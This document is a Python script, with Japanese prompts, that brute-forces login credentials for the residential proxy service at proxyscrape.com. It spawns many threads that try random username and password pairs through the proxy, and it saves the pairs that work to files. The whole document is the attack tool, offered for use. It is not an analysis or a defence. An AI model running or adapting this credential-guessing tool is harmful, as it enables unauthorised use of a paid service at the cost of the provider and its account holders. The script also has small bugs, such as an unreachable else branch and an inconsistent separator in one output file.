import requests, os, threading, gratient, random
from threading import active_count, Thread
from colorama import Fore

base = "residential.proxyscrape.com:8080"

print("Warn\nこのプログラムを使用して起きたいかなる問題についても製作者は責任を負いません。\nまたこのプログラムでproxyを当てれる可能性は限りなく低いです、時間を無駄にしない様にご注意ください。")

def brute():
    global base
    Test = 'qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
    Test2 = 'qwertyuiopasdfghjklzxcvbnm1234567890Q'
    u = ''.join(random.choice(Test2) for _ in range(15))
    p = ''.join(random.choice(Test) for _ in range(16))
    session = f"{u}:{p}"
    os.system(f"title Infinity Proxy is Now Working. Checking for - {session}@{base}")
    Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "accept-language": "ja,en-US;q=0.9,en;q=0.8"}
    req = requests.get(f'https://hypixel.net/', headers=Header, proxies=dict(http=f"http://{session}@{base}", https=f"http://{session}@{base}"))
    if req.status_code == 200:
        aaa = gratient.purple("Alive Proxy")
        print(f"{aaa} ->{Fore.RESET} {session}@{base}")
        f = open('alivepacketstreamproxies.txt', 'a', encoding='UTF-8')
        f.write(f'{session}.{base}\n')
        f.close()
    elif req.status_code == 403:
        aaa = gratient.purple("Alive Proxy, but Forbidden")
        print(f"{aaa} ->{Fore.RESET} {session}@{base}")
        f = open('Forbidden.txt', 'a', encoding='UTF-8')
        f.write(f'{session}@{base}\n')
        f.close()
    elif req.status_code == 429:
        aaa = gratient.purple("Alive Proxy, but RateLimited.")
        print(f"{aaa} ->{Fore.RESET} {session}@{base}")
        f = open('RateLimited.txt', 'a', encoding='UTF-8')
        f.write(f'{session}@{base}\n')
        f.close()
    else:
        aaa = gratient.yellow(f"{session}@{base} is Not Working\nStatus Code -> {req.status_code}")
        print(aaa)

if __name__ == "__main__":
    NThread = input("何threadにする?  -> ")
    while True:
        Run = True
        while Run:
            if active_count() <= int(NThread):
                try:
                    Thread(target=brute).start()
                except:
                    pass
    else:
            if active_count() <= int(NThread):
                try:
                    Thread(target=brute).start()
                except Exception as e:
                    print("error")
